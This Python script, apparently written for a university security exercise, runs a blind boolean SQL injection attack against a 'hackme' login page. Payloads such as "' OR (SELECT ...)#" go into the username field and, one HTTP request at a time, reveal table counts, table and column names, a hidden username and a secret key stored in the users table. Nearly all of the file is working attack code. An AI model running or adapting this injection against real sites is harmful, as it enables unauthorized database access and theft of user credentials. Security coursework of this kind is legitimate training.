# Name: Kunal Mukherjee
# Personal email: kunmukh@GMAIL.COM
# Date: 4/27/21
# File name: 
# Project name:

import mechanize
hackme_url="http://fiona.utdallas.edu/hackme/index.php"
username_file="users.txt"

alpha = ['0', '1', '2', '3', '4', '5', '6', '7', '8', '9', 'A', 'B', 'C',
         'D', 'E', 'F','G', 'H', 'I', 'J', 'K', 'L', 'M',
             'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
             'a', 'b', 'c',
             'd', 'e', 'f','g', 'h',
             'i', 'j', 'k', 'l', 'm',
             'n', 'o', 'p', 'q', 'r',
             's', 't', 'u', 'v', 'w',
             'x', 'y', 'z']

def printErrorTrue():
    errorstatus=["TRUE", "FALSE"]
    for err in errorstatus:
        br = mechanize.Browser()
        br.open(hackme_url)

        # use to select the first form in the page if it is unnamed
        br.select_form(nr=0)

        br.form['username'] = f"' OR {err}#"
        br.form['password'] = "o"

        br.method = "POST"
        response = br.submit()

        body = response.read().decode("utf-8")

        print(f"{err}:{body}")


def getNumTables():
    for i in range(0, 100):
        br = mechanize.Browser()
        br.open(hackme_url)

        # use to select the first form in the page if it is unnamed
        br.select_form(nr=0)

        br.form['username'] = f"' OR " \
                              f"(SELECT COUNT(*) " \
                              f"FROM information_schema.tables " \
                              f"WHERE table_schema=database())={i}#"
        br.form['password'] = "o"

        br.method = "POST"
        response = br.submit()

        body = response.read().decode("utf-8")

        if "user name" not in body:
            print(f"Num tables:{i}")
            return


def getTableLength(i, j):
    for k in range(0, 100):
        br = mechanize.Browser()
        br.open(hackme_url)

        # use to select the first form in the page if it is unnamed
        br.select_form(nr=0)

        br.form['username'] = f"' OR " \
                              f"(SELECT LENGTH(table_name) " \
                              f"FROM information_schema.tables " \
                              f"WHERE table_schema=database() LIMIT {i},{j})" \
                              f"={k}#"
        br.form['password'] = "o"

        br.method = "POST"
        response = br.submit()

        body = response.read().decode("utf-8")

        if "user name" not in body:
            print(f"Table length:table {i+1}:{k}")
            return k


def checkTableNames(i, j, name):

    br = mechanize.Browser()
    br.open(hackme_url)

    # use to select the first form in the page if it is unnamed
    br.select_form(nr=0)

    br.form['username'] = f"' OR " \
                          f"(SELECT table_name " \
                          f"FROM information_schema.tables " \
                          f"WHERE table_schema=database() LIMIT {i},{j})" \
                          f" LIKE '{name}'#"
    br.form['password'] = "o"

    br.method = "POST"
    response = br.submit()

    body = response.read().decode("utf-8")

    if "user name" not in body:
        print(f"Table name: {name}: is in DB")


def getNumCols(table):
    for i in range(0, 100):
        br = mechanize.Browser()
        br.open(hackme_url)

        # use to select the first form in the page if it is unnamed
        br.select_form(nr=0)

        br.form['username'] = f"' OR " \
                              f"(SELECT COUNT(column_name) " \
                              f"FROM information_schema.columns " \
                              f"WHERE table_schema=database() AND " \
                              f"table_name='{table}')={i}#"
        br.form['password'] = "o"

        br.method = "POST"
        response = br.submit()

        body = response.read().decode("utf-8")

        if "user name" not in body:
            print(f"Num columns:{i} in table: {table}")
            return


def checkColNames(i, j, table, col):
    br = mechanize.Browser()
    br.open(hackme_url)

    # use to select the first form in the page if it is unnamed
    br.select_form(nr=0)

    br.form['username'] = f"' OR " \
                          f"(SELECT column_name " \
                          f"FROM information_schema.columns " \
                          f"WHERE table_schema=database() " \
                          f"AND table_name='{table}' LIMIT {i},{j})" \
                          f" LIKE '{col}'#"
    br.form['password'] = "o"

    br.method = "POST"
    response = br.submit()

    body = response.read().decode("utf-8")

    if "user name" not in body:
        print(f"Col name: {col}: is in table {table}")


def getSpecialUser(table, non_special_user):
    non_special_user.append("AJW170130")
    non_special_user.append("JDW170000")
    non_special_user.append("CONGRATULATION!")

    usr_str = f""
    for usr in non_special_user:
        usr_str += f" username!='{usr}' and"
    usr_str = usr_str[:-3]

    specialuser=""
    while len(specialuser) < 5:
        for a in alpha:
            br = mechanize.Browser()
            br.open(hackme_url)

            # use to select the first form in the page if it is unnamed
            br.select_form(nr=0)
            br.form['username'] = f"' OR (SELECT username FROM {table} " \
                                  f" WHERE {usr_str} AND username='ETHAN' " \
                                  f" LIMIT 1) " \
                                  f" LIKE '{specialuser}{a}%'#"
            br.form['password'] = "o"

            br.method = "POST"
            response = br.submit()

            body = response.read().decode("utf-8")

            if "user name" not in body:
                specialuser+=a
                print(f"{specialuser}")
                break

    print(f"Special username found:{specialuser}")


def getSpecialKey(specialUser):
    specialkey = ""

    while len(specialkey) < 10:
        for i, a in enumerate(alpha):
            br = mechanize.Browser()
            br.open(hackme_url)

            # use to select the first form in the page if it is unnamed
            br.select_form(nr=0)

            br.form['username'] = f"' OR (SELECT extra FROM users " \
                                  f" WHERE username='{specialUser}'" \
                                  f" LIMIT 1) " \
                                  f" LIKE '{specialkey}{a}%'#"
            br.form['password'] = "o"

            br.method = "POST"
            response = br.submit()

            body = response.read().decode("utf-8")

            if "user name" not in body:
                specialkey += a
                print(f"Special Key: {specialkey}")
                break


def main():
    print(f"\nDifferent error message: ")
    printErrorTrue()

    print(f"\nTrying to find number of tables")
    getNumTables()

    print(f"\nTrying to get the table length")
    l1 = getTableLength(0, 1)
    l2 = getTableLength(1, 1)

    print(f"\nCheck the table names")
    checkTableNames(0, 1, "threads")
    checkTableNames(1, 1, "users")

    print(f"\nTrying to find number of columns in users table")
    getNumCols("users")

    print(f"\nCheck the column names")
    checkColNames(0, 1, "users", "username")
    checkColNames(1, 1, "users", "pass")
    checkColNames(2, 1, "users", "fname")
    checkColNames(3, 1, "users", "lname")
    checkColNames(4, 1, "users", "extra")
    checkColNames(5, 1, "users", "extra2")

    print(f"Load all username:")
    username_f = open(username_file, "r")
    username_lst = []
    for x in username_f:
        username_lst.append(x.replace("\n", ""))
    username_f.close()
    username_lst.append("CONGRATULATION!")

    print(f"Get username that is not a normal user")
    print(f"Username: congratulation!")
    print(f"Finding special username: !")

    getSpecialUser("users", username_lst)

    print(f"Getting the EXTRA special key from ETHAN")
    getSpecialKey("ETHAN")

if __name__ == '__main__':
    main()